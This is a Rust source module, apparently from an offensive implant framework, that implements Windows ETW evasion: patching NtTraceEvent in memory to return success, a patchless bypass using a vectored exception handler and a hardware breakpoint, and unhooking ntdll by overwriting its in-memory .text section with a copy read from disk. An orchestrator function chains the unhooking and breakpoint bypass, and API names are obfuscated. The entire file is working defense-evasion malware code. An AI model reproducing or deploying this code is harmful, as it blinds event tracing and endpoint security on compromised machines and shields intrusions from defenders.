//! ETW bypass (BOAZ etw_pass port).
//!
//! Three complementary techniques:
//! 1. `neutralize_etw`  — patch NtTraceEvent with `xor rax,rax; ret`
//! 2. `bypass_etw_hwbp` — patchless via VEH + hardware breakpoint (Dr0)
//! 3. `restore_ntdll`   — load a clean copy of ntdll from disk
//!
//! `everything()` chains them: restore → bypass.

use core::ffi::c_void;
use core::ptr::null_mut;
use core::sync::atomic::{AtomicPtr, Ordering};

use crate::types::{
    CONTEXT, CONTEXT_DEBUG_REGISTERS, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
    EXCEPTION_POINTERS, EXCEPTION_SINGLE_STEP, PAGE_EXECUTE_READWRITE,
};
use malefic_os_win::kit::binding::{
    MAddVectoredExceptionHandler, MGetCurrentProcess, MGetCurrentThread, MGetProcAddress,
    MGetThreadContext, MLoadLibraryA, MNtFlushInstructionCache, MSetThreadContext, MVirtualProtect,
};

// ─── Technique 1: patch NtTraceEvent ─────────────────────────────────────────

/// Overwrite the first bytes of `NtTraceEvent` with `xor rax,rax; ret`
/// so all ETW write calls silently return 0 (STATUS_SUCCESS).
#[cfg(target_arch = "x86_64")]
pub fn neutralize_etw() -> bool {
    unsafe {
        let ntdll = {
            let name = obf_cstr!(b"ntdll.dll\0");
            MLoadLibraryA(name.as_ptr())
        };
        if ntdll.is_null() {
            return false;
        }

        let func_addr = {
            let name = obf_cstr!(b"NtTraceEvent\0");
            MGetProcAddress(ntdll as *const c_void, name.as_ptr())
        };
        if func_addr.is_null() {
            return false;
        }

        // xor rax, rax (48 31 C0) + ret (C3)
        let patch: [u8; 4] = [0x48, 0x31, 0xC0, 0xC3];
        let mut old_prot: u32 = 0;
        if !MVirtualProtect(
            func_addr as *mut c_void,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        ) {
            return false;
        }

        core::ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());
        MVirtualProtect(
            func_addr as *mut c_void,
            patch.len(),
            old_prot,
            &mut old_prot,
        );
        MNtFlushInstructionCache(MGetCurrentProcess(), func_addr as *mut c_void, patch.len());
        true
    }
}

// ─── Technique 2: patchless — VEH + HWBP ─────────────────────────────────────

/// Address of a single-byte `ret` stub used as the redirect target.
/// Written once and read by the VEH handler.
static RET_STUB_ADDR: AtomicPtr<c_void> = AtomicPtr::new(null_mut());

/// Address of the breakpointed function (NtTraceEvent).
static BP_TARGET: AtomicPtr<c_void> = AtomicPtr::new(null_mut());

/// VEH handler: when the HWBP on NtTraceEvent fires, redirect RIP to
/// a `ret` stub and clear the breakpoint state so execution continues.
#[cfg(target_arch = "x86_64")]
unsafe extern "system" fn etw_veh_handler(exc: *mut EXCEPTION_POINTERS) -> i32 {
    let exc = &*exc;
    if exc.ExceptionRecord.is_null() || exc.ContextRecord.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let record = &*exc.ExceptionRecord;
    let ctx = &mut *exc.ContextRecord;

    if record.ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let bp = BP_TARGET.load(Ordering::Relaxed);
    let rip = ctx.rip() as *mut c_void;
    if rip != bp {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Redirect to ret stub
    let stub = RET_STUB_ADDR.load(Ordering::Relaxed);
    ctx.set_rip(stub as u64);

    // Clear Dr0 + Dr7 enable bits so we don't keep firing
    ctx.set_dr(0, 0);
    let dr7 = ctx.dr7() & !(0b11u64); // clear local enable bit 0
    ctx.set_dr7(dr7);

    EXCEPTION_CONTINUE_EXECUTION
}

/// Install VEH + HWBP on `NtTraceEvent` to silently swallow all ETW events.
#[cfg(target_arch = "x86_64")]
pub fn bypass_etw_hwbp() -> bool {
    unsafe {
        // Allocate a tiny executable stub: just a `ret` (0xC3)
        use crate::types::{MEM_COMMIT, MEM_RESERVE};
        use malefic_os_win::kit::binding::MVirtualAlloc;
        let stub = MVirtualAlloc(
            null_mut(),
            16,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if stub.is_null() {
            return false;
        }
        *(stub as *mut u8) = 0xC3;
        RET_STUB_ADDR.store(stub, Ordering::Relaxed);

        // Get NtTraceEvent address
        let _obf_ntdll_dll = obf_cstr!(b"ntdll.dll\0");
        let ntdll = MLoadLibraryA(_obf_ntdll_dll.as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let _obf_nttraceevent = obf_cstr!(b"NtTraceEvent\0");
        let nt_trace = MGetProcAddress(ntdll as *const c_void, _obf_nttraceevent.as_ptr());
        if nt_trace.is_null() {
            return false;
        }
        BP_TARGET.store(nt_trace as *mut c_void, Ordering::Relaxed);

        // Register VEH
        let veh = MAddVectoredExceptionHandler(1, etw_veh_handler as *mut c_void);
        if veh.is_null() {
            return false;
        }

        // Set Dr0 = NtTraceEvent, Dr7 bit 0 = local enable
        let hthread = MGetCurrentThread();
        let mut ctx = CONTEXT::new();
        ctx.set_context_flags(CONTEXT_DEBUG_REGISTERS);
        if !MGetThreadContext(hthread, &mut ctx as *mut CONTEXT as *mut c_void) {
            return false;
        }
        ctx.set_dr(0, nt_trace as u64);
        let dr7 = ctx.dr7() | 0x1; // local enable Dr0
        ctx.set_dr7(dr7);
        MSetThreadContext(hthread, &mut ctx as *mut CONTEXT as *mut c_void)
    }
}

// ─── Technique 3: restore ntdll from disk ────────────────────────────────────

/// Load a clean copy of `ntdll.dll` from the file system and overwrite
/// the `.text` section of the in-memory (potentially hooked) ntdll.
pub fn restore_ntdll() -> bool {
    unsafe {
        let ntdll_path = obf_cstr!(b"C:\\Windows\\System32\\ntdll.dll\0");
        let disk_bytes = match std::fs::read(
            std::str::from_utf8(&ntdll_path[..ntdll_path.len() - 1]).unwrap(),
        ) {
            Ok(b) => b,
            Err(_) => return false,
        };

        // Find in-memory ntdll base
        let ntdll_base = {
            let _obf_ntdll_dll_1 = obf_cstr!(b"ntdll.dll\0");
            let h = MLoadLibraryA(_obf_ntdll_dll_1.as_ptr());
            if h.is_null() {
                return false;
            }
            h as *mut u8
        };

        // Parse DOS + PE headers to find .text section in the disk image
        let disk = disk_bytes.as_ptr();
        let dos_e_lfanew = i32::from_ne_bytes(*(disk.add(0x3C) as *const [u8; 4]));
        let nt_hdrs = disk.add(dos_e_lfanew as usize);
        // NumberOfSections at PE+0x06
        let num_sections = u16::from_ne_bytes(*(nt_hdrs.add(6) as *const [u8; 2])) as usize;
        // SizeOfOptionalHeader at PE+0x14
        let opt_hdr_size = u16::from_ne_bytes(*(nt_hdrs.add(20) as *const [u8; 2])) as usize;
        // Section table starts after the optional header
        let section_ptr = nt_hdrs.add(24 + opt_hdr_size);

        for i in 0..num_sections {
            let sec = section_ptr.add(i * 40);
            let name = core::slice::from_raw_parts(sec, 8);
            if name.starts_with(b".text") {
                let virt_addr = u32::from_ne_bytes(*(sec.add(12) as *const [u8; 4])) as usize;
                let raw_off = u32::from_ne_bytes(*(sec.add(20) as *const [u8; 4])) as usize;
                let size = u32::from_ne_bytes(*(sec.add(16) as *const [u8; 4])) as usize;

                let mem_text = ntdll_base.add(virt_addr);
                let disk_text = disk.add(raw_off);

                let mut old_prot: u32 = 0;
                if !MVirtualProtect(
                    mem_text as *mut c_void,
                    size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_prot,
                ) {
                    return false;
                }

                core::ptr::copy_nonoverlapping(disk_text, mem_text, size);

                MVirtualProtect(mem_text as *mut c_void, size, old_prot, &mut old_prot);
                MNtFlushInstructionCache(MGetCurrentProcess(), mem_text as *mut c_void, size);
                return true;
            }
        }
        false
    }
}

// ─── Orchestrator ─────────────────────────────────────────────────────────────

/// Full ETW evasion chain: restore ntdll, then apply HWBP bypass.
pub fn everything() {
    restore_ntdll();
    #[cfg(target_arch = "x86_64")]
    bypass_etw_hwbp();
}
